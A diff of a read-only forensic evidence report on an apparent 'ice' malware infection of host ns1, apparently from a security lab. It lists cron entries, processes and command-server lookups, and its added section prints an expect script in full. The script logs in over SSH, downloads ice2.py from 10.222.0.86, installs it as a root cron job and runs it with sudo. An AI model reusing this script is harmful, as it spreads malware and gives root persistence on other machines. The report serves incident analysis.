@@ -1,7 +1,8 @@
-== Evidence of ice on ns1 (2026-11-12 12:43): read-only, secrets redacted, ice not executed
+== Evidence of ice on ns1 (2026-11-12 13:12): read-only, secrets redacted, ice not executed
 INFO  /tmp/.test: present, 1 line(s) used as secrets to redact (never printed)
 
 == Metadata
+INFO  /tmp/poiuytree: 923 bytes, owner uid 0, mode 0o755, modified 2026-11-12 12:26, sha256 ee5862ae83855f99db85679121df97c8093e7bba2e497a026d0c5dd11db3e609
 INFO  /usr/local/bin/ice.py: 0 bytes, owner uid 1001, mode 0o664, modified 2026-11-12 12:37, sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 INFO  /usr/local/bin/ice2.py: 5494 bytes, owner uid 1001, mode 0o664, modified 2026-11-09 15:30, sha256 d18b295830034bc7311d4cc469e37c7a303ae5ecb1a1eb3f77fdf48b25acd34c
 INFO  /etc/crontab lines running ice: 42
@@ -9,7 +10,89 @@ INFO  /etc/crontab lines running ice: 42
         23:30 * * * * root python3 /usr/local/bin/ice.py
 INFO  process: 1821 1808 root Tue Nov 10 10:30:00 2026 /bin/sh -c python3 /usr/local/bin/ice2.py
 INFO  process: 1824 1821 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
-INFO  process: 36322 36314 root Thu Nov 12 12:43:16 2026 python3 -I /home/user/Desktop/group4-welcome/checks/evidence_ice.py ns1 /tmp/evidence-ice-ns1.txt
+
+== Orders: what ice started and what the command servers answer now (nothing is executed)
+INFO  processes started by ice now: 
+        1824 1821 root Tue Nov 10 10:30:00 2026 python3 /usr/local/bin/ice2.py
+        35519 1824 root Thu Nov 12 12:26:45 2026 [poiuytree] <defunct>
+        35520 1824 root Thu Nov 12 12:26:45 2026 [poiuytree] <defunct>
+INFO  journal lines about next.py, poiuytre or the command servers: 
+        2026-11-12T11:35:48+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:500:9f::42#53
+        2026-11-12T11:35:48+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:500:2::c#53
+        2026-11-12T11:35:50+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:500:2f::f#53
+        2026-11-12T11:35:50+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:503:c27::2:30#53
+        2026-11-12T11:35:50+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:7fe::53#53
+        2026-11-12T11:35:50+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:dc3::35#53
+        2026-11-12T11:35:52+01:00 ns1 named[1474]: network unreachable resolving 'safeupdate.umons/DS/IN': 2001:503:ba3e::2:30#53
+        2026-11-12T11:35:57+01:00 ns1 named[1474]: broken trust chain resolving 'safeupdate.umons/AAAA/IN': 10.4.255.254#53
+        2026-11-12T11:35:57+01:00 ns1 named[1474]: broken trust chain resolving 'safeupdate.umons/A/IN': 10.4.255.254#53
+        2026-11-12T12:26:45+01:00 ns1 sudo[35511]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 755 /tmp/poiuytree
+INFO  safeupdate.umons resolves to: nothing
+INFO  files in /tmp (name, size, date):
+        drwxrwxrwt 13 root   root     460 2026-11-12T13:12 .
+        drwxr-xr-x 19 root   root    4096 2026-11-04T09:45 ..
+        -rw-r--r--  1 root   root    8271 2026-11-12T12:27 check-full-ns1.txt
+        -rw-r--r--  1 root   root     128 2026-11-12T12:22 check-mailtest.txt
+        -rw-r--r--  1 root   root   10403 2026-11-12T12:22 check-ns1.txt
+        -rw-r--r--  1 root   root    4259 2026-11-10T19:32 check-welcome.txt
+        -rw-r--r--  1 root   root    6716 2026-11-12T12:43 evidence-ice-ns1.txt
+        drwxrwxrwt  2 root   root      40 2026-11-10T10:13 .font-unix
+        drwxrwxrwt  2 root   root      60 2026-11-10T10:13 .ICE-unix
+        -rw-r--r--  1 root   root       0 2026-11-10T10:30 .isice2
+        -rwxr-xr-x  1 root   root     923 2026-11-12T12:26 poiuytree
+        drwx------  2 user   user      60 2026-11-10T10:13 ssh-YyAKhlemWYEJ
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-colord.service-nd3L9C
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-lm-sensors.service-PvzGhP
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-ModemManager.service-sLdHOK
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-polkit.service-XSpTbl
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-systemd-logind.service-8H88fz
+        drwx------  3 root   root      60 2026-11-10T10:13 systemd-private-93062123108044ad86f1e589edb0ca93-upower.service-eRaIfZ
+        -rw-rw-r--  1 mother mother     7 2026-11-12T12:37 .test
+        -r--r--r--  1 root   root      11 2026-11-10T10:13 .X0-lock
+        drwxrwxrwt  2 root   root      60 2026-11-12T13:12 .X11-unix
+        -rw-------  1 user   user     402 2026-11-10T10:13 .xfsm-ICE-NLCNY3
+        drwxrwxrwt  2 root   root      40 2026-11-10T10:13 .XIM-unix
+INFO  GET https://safeupdate.umons/next (saved to /root/next-observed-safeupdate.umons.txt, NOT executed): HTTP status and bytes: 000 0
+INFO  GET https://10.222.0.86/next (saved to /root/next-observed-10.222.0.86.txt, NOT executed): HTTP status and bytes: 404 0
+
+== Content of /tmp/poiuytree (1 value(s) redacted)
+#!/usr/bin/expect -f
+set pass [lrange $argv 0 0]
+set server [lrange $argv 1 1]
+set name [lrange $argv 2 2]
+
+spawn ssh -o "StrictHostKeyChecking no" $name@$server
+match_max 100000
+expect "*?assword:*"
+send -- "$pass\r"
+send -- "\r"
+expect "$ "
+send "file /tmp/.isice2\r"
+expect {
+    empty {
+        exit
+    } "cannot open" {
+    
+    }
+}
+send "wget --no-check-certificate -O /tmp/ice2.py https://10.222.0.86/ice2.py \r"
+expect "$ "
+send "echo <REDACTED> | sudo -Si >/dev/null 2>&1 \r"
+expect "$ "
+send "sudo mv /tmp/ice2.py /usr/local/bin/ice2.py \r"
+expect "$ "
+send "echo '30 * * * * root python3 /usr/local/bin/ice2.py' | sudo tee -a /etc/crontab \r"
+expect "$ "
+send "echo $pass > /tmp/.test \r"
+expect "$ "
+send "nohup sh -c 'cat /tmp/.test | sudo -S python3 /usr/local/bin/ice2.py' > /dev/null 2>&1 & \r"
+expect "$ "
+send "sudo /etc/init.d/cron reload \r"
+expect "$ "
+send "sudo service crond reload \r"
+expect "$ "
+    
+== End of /tmp/poiuytree
 
 == Content of /usr/local/bin/ice.py (0 value(s) redacted)
 
